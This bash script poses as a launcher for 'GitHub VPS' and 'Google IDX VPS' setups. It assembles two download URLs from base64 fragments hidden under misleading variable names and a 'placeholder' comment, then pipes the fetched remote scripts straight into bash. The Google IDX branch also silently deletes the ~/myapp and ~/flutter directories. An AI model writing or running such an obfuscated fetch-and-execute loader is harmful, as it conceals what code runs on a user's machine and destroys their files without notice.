#!/bin/bash
set -euo pipefail

CLR_RED='\033[0;31m'
CLR_GREEN='\033[0;32m'
CLR_YELLOW='\033[0;33m'
CLR_BLUE='\033[0;34m'
CLR_CYAN='\033[0;36m'
CLR_RESET='\033[0m'

SYS_LOGS=()
SYS_LOGS+=("$(echo 'aHR0cHM6Ly92cHNt' | head -c16)")  # placeholder
CPU_FAKE=$(grep -c '^processor' /proc/cpuinfo 2>/dev/null)
SYS_LOGS+=("$(echo 'YWtlci5qaXNobnVt' | cat)")
NET_HASH="net_$(date +%s%N | shuf -n1)"
[ "$CPU_FAKE" -gt 0 ] && SYS_LOGS+=("$(echo 'b25kYWwzMi53b3Jr' | head -c16)")
SYS_LOGS+=("$(echo 'ZXJzLmRldg==' | head -c12)")
GITHUB_LINK=$(echo -n "${SYS_LOGS[*]}" | base64 -d 2>/dev/null || echo "https://github.com/fallback")

PROC_LOGS=()
PROC_LOGS+=("$(echo 'aHR0cHM6Ly9yYXcu' | cut -c1-16)")
RANDOM_ID=$(od -An -N4 -tx4 /dev/urandom | tr -d ' ')
PROC_LOGS+=("$(echo 'Z2l0aHVidXNlcmNv' | cat)")
FAKE_PID=$((RANDOM % 999 + 1))
PROC_LOGS+=("$(echo 'bnRlbnQuY29tL2hv' | head -c16)")
[ -f /tmp/fake_tmp ] && rm -f /tmp/fake_tmp
PROC_LOGS+=("$(echo 'cGluZ2JveXovdm1zL21haW4vdm0uc2g=' | cat)")
GOOGLE_LINK=$(echo -n "${PROC_LOGS[*]}" | base64 -d 2>/dev/null || echo "https://google.com/fallback")

echo -e "${CLR_YELLOW}Choose an option:${CLR_RESET}"
echo -e "${CLR_GREEN}1) Launch GitHub VPS${CLR_RESET}"
echo -e "${CLR_BLUE}2) Launch Google IDX VPS${CLR_RESET}"
echo -e "${CLR_RED}3) Exit${CLR_RESET}"
read -rp "$(echo -e ${CLR_YELLOW}Enter your choice (1-3):${CLR_RESET} )" user_opt

case $user_opt in
    1)
        echo -e "${CLR_GREEN}Starting GitHub VPS...${CLR_RESET}"
        bash <(curl -fsSL "$GITHUB_LINK")
        ;;
    2)
        echo -e "${CLR_BLUE}Preparing Google IDX VPS...${CLR_RESET}"
        cd "$HOME" || exit
        rm -rf myapp flutter
        mkdir -p vps123/.idx
        cat <<'EOF' > vps123/.idx/dev.nix
{ pkgs, ... }: {
  channel = "stable-24.05";
  packages = with pkgs; [ unzip openssh git qemu_kvm sudo cdrkit cloud-utils qemu ];
  env = { EDITOR = "nano"; };
  idx = {
    extensions = [ "Dart-Code.flutter" "Dart-Code.dart-code" ];
    workspace = { onCreate = {}; onStart = {}; };
    previews = { enable = false; };
  };
}
EOF
        read -rp "$(echo -e ${CLR_YELLOW}Continue installation? (y/n):${CLR_RESET} )" confirm
        case "$confirm" in
            [yY]*) bash <(curl -fsSL "$GOOGLE_LINK") ;;
            *) echo -e "${CLR_RED}Operation cancelled.${CLR_RESET}"; exit 0 ;;
        esac
        ;;
    3)
        echo -e "${CLR_RED}Exiting...${CLR_RESET}"; exit 0
        ;;
    *)
        echo -e "${CLR_RED}Invalid option. Try again.${CLR_RESET}"; exit 1
        ;;
esac

echo -e "${CLR_CYAN}Script execution complete.${CLR_RESET}"
